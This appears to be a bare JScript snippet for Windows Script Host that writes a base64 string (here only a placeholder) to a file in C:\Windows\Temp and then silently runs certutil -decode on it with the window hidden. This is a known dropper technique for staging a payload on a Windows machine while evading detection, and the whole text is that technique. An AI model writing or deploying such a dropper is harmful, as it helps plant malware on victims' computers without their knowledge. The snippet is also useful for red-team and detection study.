var fso = new ActiveXObject("Scripting.FileSystemObject");
var b = fso.CreateTextFile("C:\\Windows\\Temp\\base64", true);
b.WriteLine("base64_encoded_file");
b.Close();
var go = new ActiveXObject("Wscript.Shell").Run("certutil -decode C:\\Windows\\Temp\\base64 C:\\Windows\\Temp\\file.*",0);
